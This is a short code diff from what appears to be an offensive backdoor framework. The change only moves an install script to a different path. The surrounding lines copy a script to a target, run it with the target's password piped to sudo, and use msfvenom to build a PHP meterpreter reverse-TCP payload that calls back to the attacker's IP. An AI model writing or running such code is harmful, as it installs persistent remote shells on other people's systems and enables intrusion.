@@ -26,7 +26,7 @@ class Web(Backdoor):
         port = self.get_value("port")
         name = self.get_value("name")
         target = self.core.curtarget
-        target.scpFiles(self, "backdoors/web/install.sh", False)
+        target.scpFiles(self, "auxiliary/web/install.sh", False)
         target.ssh.exec_command("echo " + target.pword + " | sudo -S bash install.sh")
         print(GOOD + "Starting Apache server on target...")
         os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + self.core.localIP + " LPORT=" + str(port) + " -f raw > " + name) 
